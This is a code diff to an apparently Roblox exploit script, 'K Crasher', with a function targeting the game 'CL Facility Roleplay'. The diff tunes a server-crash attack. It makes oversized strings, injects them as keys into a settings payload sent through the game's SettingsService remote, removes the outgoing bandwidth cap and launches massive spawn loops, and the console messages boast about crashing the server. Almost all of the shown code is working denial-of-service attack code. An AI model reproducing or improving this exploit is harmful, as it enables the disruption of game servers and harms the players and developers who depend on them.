@@ -799,7 +799,7 @@ end
 function C.K_6416498845() -- CL Facility Roleplay
 	repeat wait() until game:IsLoaded()
 	printconsole('Crashing..')
-	LongString = string.rep('did u rlly even try LMAOO. K crahser on top :)                                              ',99000)
+	LongString = string.rep('did u rlly even try LMAOO. K crahser on top :)                                              ',9999)
 
 	local SettingsService;
 	for i,v in pairs(game:GetService('ReplicatedStorage'):GetDescendants()) do
@@ -869,53 +869,55 @@ function C.K_6416498845() -- CL Facility Roleplay
 			if _G.um ~= nil and typeof(_G.um) == 'string' and _G.um:len() >= 9500000 then print('done2'); task.cancel(core) return end
 			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge);
 			SettingsService.RF.Set:InvokeServer({
-["Movement"] = {["ControllerDeadzone"] = 0.2},
-["Firearms"] = {
-["RightAimOffsetY"] = 0.1,
-["DisableExtraVisuals"] = false,
-["AimIndicatorPrimarySize"] = 1,
-["LeftAimOffsetX"] = -1.7,
-["AimIndicatorSecondarySize"] = 1,
-["LeftAimOffsetY"] = 0.1,
-["AimIndicatorPrimaryColor"] = {
-["B"] = 1,
-["Type"] = 'Color3',
-["G"] = 1,
-["R"] = 1
-},
-["ShakeRoughness"] = 2,
-["RightAimOffsetX"] = 1.8,
-["DisableSeeThrough"] = false,
-["ShakeMagnitude"] = 2.5,
-["AimIndicatorSecondaryColor"] = {
-["B"] = 1,
-["Type"] = 'Color3',
-["G"] = 1,
-["R"] = 1
-}
-},
-["Gamepasses"] = {
-["NoArmorSpawn"] = false
-},
-["Audio-"..LongString] = {
-["DynamicReverb"] = true,
-["AlarmVolume"] = 1,
-["EventVolume"] = 0.5,
-["SFXVolume"] = 5,
-["MusicVolume"] = 1
-},
-["Graphics"] = {
-["SpinFans"] = false,
-["ExpStreaming"] = true,
-["DisableColorCorrection"] = false,
-["VolumetricSmoke"] = true,
-["DisableTextures"] = false,
-["RemoveProps"] = true,
-},
-["Keybinds"] = {
-["HideAllKeybinds"] = false,
-["HideBasicKeybinds"] = false
-}
+									[LongString] = {
+																		[LongString] = 0.2
+									},
+									[LongString..'1'] = {
+																		[LongString] = 0.1,
+																		["DisableExtraVisuals"] = false,
+																		["AimIndicatorPrimarySize"] = 1,
+																		["LeftAimOffsetX"] = -1.7,
+																		["AimIndicatorSecondarySize"] = 1,
+																		["LeftAimOffsetY"] = 0.1,
+																		["AimIndicatorPrimaryColor"] = {
+																											["B"] = 1,
+																											["Type"] = 'Color3',
+																											["G"] = 1,
+																											["R"] = 1
+																		},
+																		["ShakeRoughness"] = 2,
+																		["RightAimOffsetX"] = 1.8,
+																		["DisableSeeThrough"] = false,
+																		["ShakeMagnitude"] = 2.5,
+																		["AimIndicatorSecondaryColor"] = {
+																											["B"] = 1,
+																											["Type"] = 'Color3',
+																											["G"] = 1,
+																											["R"] = 1
+																		}
+									},
+									[LongString] = {
+																		["NoArmorSpawn"] = false
+									},
+									["Audio"] = {
+																		["DynamicReverb"] = true,
+																		["AlarmVolume"] = 1,
+																		["EventVolume"] = 0.5,
+																		["SFXVolume"] = 5,
+																		["MusicVolume"] = 1
+									},
+									["Graphics"] = {
+																		["SpinFans"] = false,
+																		["ExpStreaming"] = true,
+																		["DisableColorCorrection"] = false,
+																		["VolumetricSmoke"] = true,
+																		["DisableTextures"] = false,
+																		["RemoveProps"] = true,
+									},
+									["Keybinds"] = {
+																		["HideAllKeybinds"] = false,
+																		["HideBasicKeybinds"] = false
+									}
 })
 		--end
 		pcall(function() task.cancel(core) end)
@@ -954,11 +956,11 @@ K Crasher on top - %s bouta get crashed 🥱
 .
 ):format(numberofPlayers,numberofPlayers,numberofPlayers))
 ]]
-	task.wait(1.5)
 	printconsole('Game server completed sending request!')
 	printconsole('Attempting to crash')
-	
-	game:GetService('RunService').RenderStepped:Connect(function()
+
+	for i = 1,3  do
+		game:GetService('RunService').RenderStepped:Connect(function()
 		for i = 1, 6500 do
 			for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
 				spawn(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge) end)
@@ -968,6 +970,7 @@ K Crasher on top - %s bouta get crashed 🥱
 			end
 		end
 	end)
+	end
 
 	wait(125)
 	printconsole('Client did not crash server within 125 seconds of Get Request.')
